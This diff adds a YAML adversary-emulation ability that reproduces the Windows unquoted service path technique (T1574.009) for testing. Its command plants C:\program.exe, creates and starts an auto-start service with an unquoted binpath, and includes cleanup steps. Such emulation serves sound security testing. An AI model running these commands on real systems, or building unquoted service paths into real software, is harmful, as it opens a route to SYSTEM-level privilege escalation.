@@ -1,0 +1,24 @@
+---
+- id: 31b34d7d7b3cb21fef5da4e206e2c1ae
+  name: Execution of program.exe as service with unquoted service path
+  description: "When a service is created whose executable path contains spaces and\
+    \ isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted\
+    \ Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if\
+    \ an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead\
+    \ of test.exe in C:\\Program Files\\subfolder\\test.exe.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1574.009
+    name: 'Hijack Execution Flow: Path Interception by Unquoted Path'
+  platforms:
+    windows:
+      cmd:
+        command: copy "0655d1_WindowsServiceExample.exe" "C:\Program Files\windows_service.exe"
+          && copy "0655d1_WindowsServiceExample.exe" "C:\program.exe" && sc create
+          "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname=
+          "Example Service" start= auto && sc start "Example Service"
+        payloads:
+        - 0655d1_WindowsServiceExample.exe
+        cleanup: sc stop "Example Service" >nul 2>&1 && sc delete "Example Service"
+          >nul 2>&1 && del "C:\Program Files\windows_service.exe" >nul 2>&1 && del
+          "C:\program.exe" >nul 2>&1 && del "C:\Time.log" >nul 2>&1
